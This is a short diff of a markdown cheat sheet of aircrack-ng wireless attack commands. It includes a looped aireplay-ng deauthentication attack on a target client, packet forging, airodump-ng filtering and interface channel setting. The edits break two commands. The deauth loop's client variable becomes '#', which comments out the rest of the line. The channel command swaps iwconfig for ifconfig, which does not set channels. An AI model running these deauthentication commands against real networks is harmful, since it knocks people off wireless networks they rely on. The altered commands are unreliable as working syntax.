@@ -202,7 +202,7 @@ packetforge-ng -0 -a ap_mac -h our_mac -k 255.255.255.255 -l 255.255.255.255 -y 
 #### Loops
 Loop deauthentication attack to target client.
 ```bash
-for s in `seq 1 1000`; do sleep 1 && aireplay-ng -0 1 -e ap_name -a ap_mac -c $i wlan0mon; done
+for s in `seq 1 1000`; do sleep 1 && aireplay-ng -0 1 -e ap_name -a ap_mac -c # wlan0mon; done
 ```
 
 #### Regex
@@ -214,7 +214,7 @@ airodump-ng wlan0mon --essid-regex "^(ap_name).*$"
 #### Force Channel
 Force wireless interface to a specific channel. Good for injection card.
 ```bash
-$ iwconfig wlan1mon 6
+$ ifconfig wlan1mon 6
 ```
 
 #### Renaming interface (temporary)
